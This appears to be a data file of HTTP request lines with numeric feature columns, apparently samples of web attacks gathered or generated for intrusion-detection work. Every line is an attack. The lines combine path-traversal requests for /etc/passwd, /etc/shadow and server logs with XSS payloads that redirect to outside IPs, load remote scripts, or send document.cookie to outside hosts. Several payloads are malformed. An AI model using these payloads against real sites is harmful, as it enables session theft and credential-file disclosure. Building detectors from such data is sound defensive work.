44,1,200,5734,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,6327,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
84,1,200,4004,8,32,16,6,2,GET /?search=<script>%window.open('http://124.122.140.75/860894')3C/script> HTTP/1.1
84,1,200,2837,7,40,14,5,2,GET /?search=<script>window.location.href="http://109.120.237.238"</script> HTTP/1.1
101,1,200,5196,7,56,19,6,2,GET /?search=<script>window.location='http://96.14.43.189/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,2937,7,31,17,6,2,GET /?file=<script><script+src="http://226.99.98.83/88384.js=></script> HTTP/1.1
60,1,200,6710,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,3221,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1221,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4302,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1971,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2319,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,3510,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6400,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4589,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,3356,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1535,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2109,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4576,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5305,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
81,1,200,3801,8,30,16,6,2,GET /?file=<script>%window.open('http://19.27.166.194/792271')3C/script> HTTP/1.1
78,1,200,7783,7,28,17,6,2,GET /?p=<script><script+src="http://22.155.87.174/76310.js=></script> HTTP/1.1
61,1,200,6081,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1418,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7674,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7193,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1683,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,5628,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4702,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,2863,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,2776,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,2695,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,6444,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7166,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4497,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,2402,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
82,1,200,5806,8,32,16,6,2,GET /?search=<script>%window.open('http://191.76.198.67/85165')3C/script> HTTP/1.1
61,1,200,7352,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1054,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,6362,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2137,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,3232,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2005,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2006,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2565,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2113,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,6069,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,3316,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6708,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2943,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6051,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6805,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7763,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1405,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1645,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6873,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,4632,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6357,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6313,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2473,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,3814,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2465,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1834,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,4945,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1170,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,4016,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,5357,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6276,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
79,1,200,3449,8,27,16,6,2,GET /?p=<script>%window.open('http://155.49.123.111/148177')3C/script> HTTP/1.1
102,1,200,6962,7,56,19,6,2,GET /?search=<script>window.location='http://110.60.71.134/?cookie='+document.cookie</script> HTTP/1.1
96,1,200,5576,7,51,19,6,2,GET /?p=<script>window.location='http://43.37.11.208/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,2949,7,28,17,6,2,GET /?p=<script><script+src="http://15.47.105.51/983573.js=></script> HTTP/1.1
81,1,200,3088,7,31,17,6,2,GET /?name=<script><script+src="http://78.229.33.99/362741.js=></script> HTTP/1.1
102,1,200,7243,7,54,19,6,2,GET /?name=<script>window.location='http://250.184.200.220/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5949,7,38,14,5,2,GET /?file=<script>window.location.href="http://61.108.141.139"</script> HTTP/1.1
50,1,200,1255,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3038,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4854,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5390,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1832,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2972,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,6809,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7481,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2638,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7565,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2488,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3104,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5979,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3187,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
84,1,200,6851,7,31,17,6,2,GET /?name=<script><script+src="http://223.185.253.240/354662.js=></script> HTTP/1.1
81,1,200,1932,7,38,14,5,2,GET /?name=<script>window.location.href="http://150.191.147.19"</script> HTTP/1.1
76,1,200,6248,7,35,14,5,2,GET /?p=<script>window.location.href="http://156.13.47.76"</script> HTTP/1.1
51,1,200,1424,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7225,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3692,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5107,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6237,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6947,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3565,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5785,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6263,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1344,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5518,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,7563,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5609,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,6859,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4280,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
83,1,200,5218,8,30,16,6,2,GET /?file=<script>%window.open('http://188.225.168.197/848231')3C/script> HTTP/1.1
83,1,200,3495,7,40,14,5,2,GET /?search=<script>window.location.href="http://227.160.253.44"</script> HTTP/1.1
103,1,200,4000,7,56,19,6,2,GET /?search=<script>window.location='http://148.211.34.213/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,2235,7,31,17,6,2,GET /?name=<script><script+src="http://197.50.167.89/125087.js=></script> HTTP/1.1
59,1,200,7314,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,2874,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1015,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1235,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,2128,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,3307,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,2749,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1552,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6409,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,2629,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,3672,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1472,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6114,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1734,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,5587,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,4035,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1843,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6241,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,3757,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
49,1,200,1899,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,4741,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3792,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3352,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,4213,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,5539,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,4674,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,6107,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,5793,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,4058,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,6533,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
83,1,200,7191,7,40,14,5,2,GET /?search=<script>window.location.href="http://211.249.126.80"</script> HTTP/1.1
85,1,200,5238,7,33,17,6,2,GET /?search=<script><script+src="http://69.175.222.148/475365.js=></script> HTTP/1.1
98,1,200,2383,7,51,19,6,2,GET /?p=<script>window.location='http://104.70.220.179/?cookie='+document.cookie</script> HTTP/1.1
85,1,200,2619,7,33,17,6,2,GET /?search=<script><script+src="http://151.197.10.154/676295.js=></script> HTTP/1.1
102,1,200,1396,7,56,19,6,2,GET /?search=<script>window.location='http://225.67.36.188/?cookie='+document.cookie</script> HTTP/1.1
76,1,200,2147,8,27,16,6,2,GET /?p=<script>%window.open('http://19.16.13.19/679850')3C/script> HTTP/1.1
79,1,200,1129,7,38,14,5,2,GET /?name=<script>window.location.href="http://214.13.39.89"</script> HTTP/1.1
83,1,200,2169,7,31,17,6,2,GET /?name=<script><script+src="http://245.220.13.193/814926.js=></script> HTTP/1.1
84,1,200,3095,7,33,17,6,2,GET /?search=<script><script+src="http://168.180.35.71/460580.js=></script> HTTP/1.1
84,1,200,4705,7,31,17,6,2,GET /?file=<script><script+src="http://175.147.152.129/454943.js=></script> HTTP/1.1
83,1,200,6432,8,30,16,6,2,GET /?name=<script>%window.open('http://231.139.203.196/421909')3C/script> HTTP/1.1
82,1,200,3466,7,40,14,5,2,GET /?search=<script>window.location.href="http://228.66.78.194"</script> HTTP/1.1
82,1,200,6746,7,31,17,6,2,GET /?file=<script><script+src="http://176.54.64.158/699138.js=></script> HTTP/1.1
80,1,200,5285,7,38,14,5,2,GET /?name=<script>window.location.href="http://43.244.248.92"</script> HTTP/1.1
99,1,200,1555,7,54,19,6,2,GET /?file=<script>window.location='http://30.211.58.97/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,5542,7,31,17,6,2,GET /?file=<script><script+src="http://18.223.253.150/52811.js=></script> HTTP/1.1
84,1,200,6831,8,32,16,6,2,GET /?search=<script>%window.open('http://166.87.154.101/940972')3C/script> HTTP/1.1
82,1,200,6438,8,30,16,6,2,GET /?name=<script>%window.open('http://230.102.18.229/453269')3C/script> HTTP/1.1
80,1,200,7584,7,38,14,5,2,GET /?file=<script>window.location.href="http://153.31.28.239"</script> HTTP/1.1
78,1,200,6375,8,27,16,6,2,GET /?p=<script>%window.open('http://108.62.103.81/629980')3C/script> HTTP/1.1
80,1,200,5914,8,30,16,6,2,GET /?name=<script>%window.open('http://65.237.44.20/915160')3C/script> HTTP/1.1
78,1,200,3398,7,35,14,5,2,GET /?p=<script>window.location.href="http://155.147.238.34"</script> HTTP/1.1
103,1,200,4391,7,56,19,6,2,GET /?search=<script>window.location='http://108.200.124.49/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,2541,8,27,16,6,2,GET /?p=<script>%window.open('http://197.201.104.109/485259')3C/script> HTTP/1.1
97,1,200,5283,7,51,19,6,2,GET /?p=<script>window.location='http://115.52.143.11/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,4296,8,30,16,6,2,GET /?name=<script>%window.open('http://249.246.174.89/557290')3C/script> HTTP/1.1
100,1,200,7249,7,54,19,6,2,GET /?name=<script>window.location='http://231.109.25.50/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,2039,7,54,19,6,2,GET /?name=<script>window.location='http://112.91.125.180/?cookie='+document.cookie</script> HTTP/1.1
104,1,200,1600,7,56,19,6,2,GET /?search=<script>window.location='http://106.161.104.116/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,6830,7,51,19,6,2,GET /?p=<script>window.location='http://170.18.254.250/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,4838,8,27,16,6,2,GET /?p=<script>%window.open('http://162.61.127.37/837798')3C/script> HTTP/1.1
78,1,200,2062,7,35,14,5,2,GET /?p=<script>window.location.href="http://164.25.153.166"</script> HTTP/1.1
82,1,200,7418,8,30,16,6,2,GET /?file=<script>%window.open('http://200.44.106.196/120651')3C/script> HTTP/1.1
80,1,200,7143,7,31,17,6,2,GET /?file=<script><script+src="http://27.81.169.5/260920.js=></script> HTTP/1.1
86,1,200,2825,7,33,17,6,2,GET /?search=<script><script+src="http://253.119.244.157/215011.js=></script> HTTP/1.1
85,1,200,3855,7,33,17,6,2,GET /?search=<script><script+src="http://124.20.224.103/474433.js=></script> HTTP/1.1
101,1,200,6806,7,56,19,6,2,GET /?search=<script>window.location='http://157.96.123.8/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,4978,7,35,14,5,2,GET /?p=<script>window.location.href="http://51.187.179.163"</script> HTTP/1.1
98,1,200,4202,7,54,19,6,2,GET /?file=<script>window.location='http://58.6.221.52/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,4392,8,32,16,6,2,GET /?search=<script>%window.open('http://140.29.50.254/870788')3C/script> HTTP/1.1
82,1,200,2296,8,30,16,6,2,GET /?name=<script>%window.open('http://237.32.172.158/943734')3C/script> HTTP/1.1
82,1,200,1480,7,31,17,6,2,GET /?name=<script><script+src="http://33.96.171.112/355918.js=></script> HTTP/1.1
79,1,200,7733,7,38,14,5,2,GET /?name=<script>window.location.href="http://53.61.11.194"</script> HTTP/1.1
76,1,200,5560,7,35,14,5,2,GET /?p=<script>window.location.href="http://83.33.117.27"</script> HTTP/1.1
97,1,200,6501,7,51,19,6,2,GET /?p=<script>window.location='http://92.74.215.216/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,3320,7,31,17,6,2,GET /?file=<script><script+src="http://30.76.96.79/517055.js=></script> HTTP/1.1
76,1,200,2458,8,27,16,6,2,GET /?p=<script>%window.open('http://197.3.9.157/184701')3C/script> HTTP/1.1
80,1,200,1361,8,30,16,6,2,GET /?file=<script>%window.open('http://63.87.51.242/940994')3C/script> HTTP/1.1
80,1,200,2698,8,27,16,6,2,GET /?p=<script>%window.open('http://125.169.153.255/266246')3C/script> HTTP/1.1
100,1,200,5388,7,54,19,6,2,GET /?name=<script>window.location='http://50.87.248.251/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,6243,8,27,16,6,2,GET /?p=<script>%window.open('http://108.192.140.182/959118')3C/script> HTTP/1.1
100,1,200,6331,7,54,19,6,2,GET /?name=<script>window.location='http://159.50.205.20/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,6595,7,31,17,6,2,GET /?file=<script><script+src="http://135.233.243.172/506549.js=></script> HTTP/1.1
81,1,200,5853,7,38,14,5,2,GET /?name=<script>window.location.href="http://158.210.186.16"</script> HTTP/1.1
101,1,200,4035,7,54,19,6,2,GET /?name=<script>window.location='http://251.107.18.219/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,5638,8,27,16,6,2,GET /?p=<script>%window.open('http://171.77.13.182/53328')3C/script> HTTP/1.1
99,1,200,2827,7,51,19,6,2,GET /?p=<script>window.location='http://235.141.153.145/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5995,7,38,14,5,2,GET /?name=<script>window.location.href="http://21.148.206.134"</script> HTTP/1.1
79,1,200,7386,7,38,14,5,2,GET /?file=<script>window.location.href="http://185.8.226.28"</script> HTTP/1.1
103,1,200,3849,7,56,19,6,2,GET /?search=<script>window.location='http://121.49.108.145/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,6461,7,54,19,6,2,GET /?name=<script>window.location='http://132.7.123.248/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,1290,7,31,17,6,2,GET /?name=<script><script+src="http://233.42.218.209/792037.js=></script> HTTP/1.1
82,1,200,7975,8,32,16,6,2,GET /?search=<script>%window.open('http://237.80.53.14/696291')3C/script> HTTP/1.1
103,1,200,7719,7,56,19,6,2,GET /?search=<script>window.location='http://216.155.78.154/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,6501,7,31,17,6,2,GET /?file=<script><script+src="http://208.104.177.104/305778.js=></script> HTTP/1.1
83,1,200,1910,7,31,17,6,2,GET /?name=<script><script+src="http://108.78.135.141/335710.js=></script> HTTP/1.1
79,1,200,2041,8,30,16,6,2,GET /?file=<script>%window.open('http://100.206.16.90/9702')3C/script> HTTP/1.1
77,1,200,5304,7,35,14,5,2,GET /?p=<script>window.location.href="http://95.218.62.212"</script> HTTP/1.1
83,1,200,6812,7,31,17,6,2,GET /?name=<script><script+src="http://225.37.127.200/289755.js=></script> HTTP/1.1
83,1,200,6071,7,33,17,6,2,GET /?search=<script><script+src="http://33.108.4.118/343317.js=></script> HTTP/1.1
99,1,200,3746,7,54,19,6,2,GET /?file=<script>window.location='http://86.111.73.26/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,5650,7,54,19,6,2,GET /?name=<script>window.location='http://84.0.41.210/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,2959,7,56,19,6,2,GET /?search=<script>window.location='http://83.0.79.176/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,5289,7,40,14,5,2,GET /?search=<script>window.location.href="http://11.99.2.82"</script> HTTP/1.1
98,1,200,2491,7,51,19,6,2,GET /?p=<script>window.location='http://230.20.184.170/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,5572,7,56,19,6,2,GET /?search=<script>window.location='http://219.112.22.71/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,6419,8,30,16,6,2,GET /?name=<script>%window.open('http://146.250.251.0/319569')3C/script> HTTP/1.1
80,1,200,4389,7,38,14,5,2,GET /?file=<script>window.location.href="http://199.14.33.159"</script> HTTP/1.1
77,1,200,2890,7,35,14,5,2,GET /?p=<script>window.location.href="http://250.62.88.255"</script> HTTP/1.1
81,1,200,6904,7,40,14,5,2,GET /?search=<script>window.location.href="http://137.205.8.21"</script> HTTP/1.1
100,1,200,5228,7,54,19,6,2,GET /?file=<script>window.location='http://230.33.28.217/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,4809,7,35,14,5,2,GET /?p=<script>window.location.href="http://113.157.38.201"</script> HTTP/1.1
82,1,200,1387,8,32,16,6,2,GET /?search=<script>%window.open('http://172.218.102.96/5311')3C/script> HTTP/1.1
82,1,200,6534,7,38,14,5,2,GET /?file=<script>window.location.href="http://129.114.106.228"</script> HTTP/1.1
79,1,200,2299,7,28,17,6,2,GET /?p=<script><script+src="http://19.146.58.174/603590.js=></script> HTTP/1.1
77,1,200,4969,7,35,14,5,2,GET /?p=<script>window.location.href="http://124.44.45.214"</script> HTTP/1.1
99,1,200,3293,7,54,19,6,2,GET /?file=<script>window.location='http://2.137.35.119/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,4227,8,27,16,6,2,GET /?p=<script>%window.open('http://112.28.67.224/960767')3C/script> HTTP/1.1
81,1,200,5936,7,38,14,5,2,GET /?name=<script>window.location.href="http://141.246.85.242"</script> HTTP/1.1
79,1,200,4846,8,27,16,6,2,GET /?p=<script>%window.open('http://80.144.211.210/219761')3C/script> HTTP/1.1
81,1,200,3726,7,38,14,5,2,GET /?file=<script>window.location.href="http://166.163.243.71"</script> HTTP/1.1
100,1,200,2412,7,54,19,6,2,GET /?file=<script>window.location='http://76.115.207.29/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,2620,7,38,14,5,2,GET /?file=<script>window.location.href="http://58.192.2.138"</script> HTTP/1.1
102,1,200,5190,7,54,19,6,2,GET /?name=<script>window.location='http://129.235.217.219/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,4532,8,30,16,6,2,GET /?file=<script>%window.open('http://176.132.135.178/427877')3C/script> HTTP/1.1
100,1,200,6278,7,54,19,6,2,GET /?file=<script>window.location='http://243.191.69.72/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,5846,7,31,17,6,2,GET /?file=<script><script+src="http://198.110.9.183/587131.js=></script> HTTP/1.1
83,1,200,6239,8,30,16,6,2,GET /?name=<script>%window.open('http://176.121.148.173/449410')3C/script> HTTP/1.1
82,1,200,5289,8,30,16,6,2,GET /?file=<script>%window.open('http://14.167.249.237/287423')3C/script> HTTP/1.1
81,1,200,1426,8,30,16,6,2,GET /?name=<script>%window.open('http://92.250.29.187/695874')3C/script> HTTP/1.1
77,1,200,3140,8,27,16,6,2,GET /?p=<script>%window.open('http://206.13.40.224/13676')3C/script> HTTP/1.1
81,1,200,1232,7,40,14,5,2,GET /?search=<script>window.location.href="http://25.84.168.65"</script> HTTP/1.1
79,1,200,5740,8,30,16,6,2,GET /?name=<script>%window.open('http://49.18.236.40/62448')3C/script> HTTP/1.1
78,1,200,2443,7,38,14,5,2,GET /?file=<script>window.location.href="http://47.130.13.5"</script> HTTP/1.1
82,1,200,3371,7,40,14,5,2,GET /?search=<script>window.location.href="http://48.71.147.168"</script> HTTP/1.1
80,1,200,4904,7,38,14,5,2,GET /?file=<script>window.location.href="http://169.77.162.94"</script> HTTP/1.1
101,1,200,1117,7,54,19,6,2,GET /?file=<script>window.location='http://144.108.148.75/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,6580,7,38,14,5,2,GET /?name=<script>window.location.href="http://253.215.30.115"</script> HTTP/1.1
82,1,200,7757,8,32,16,6,2,GET /?search=<script>%window.open('http://49.24.210.40/289762')3C/script> HTTP/1.1
81,1,200,6749,7,38,14,5,2,GET /?name=<script>window.location.href="http://85.132.103.225"</script> HTTP/1.1
80,1,200,6369,7,28,17,6,2,GET /?p=<script><script+src="http://226.193.123.43/476503.js=></script> HTTP/1.1
104,1,200,2648,7,56,19,6,2,GET /?search=<script>window.location='http://113.102.238.159/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,7828,8,30,16,6,2,GET /?name=<script>%window.open('http://97.81.207.122/594256')3C/script> HTTP/1.1
79,1,200,2571,8,30,16,6,2,GET /?file=<script>%window.open('http://88.14.25.60/192354')3C/script> HTTP/1.1
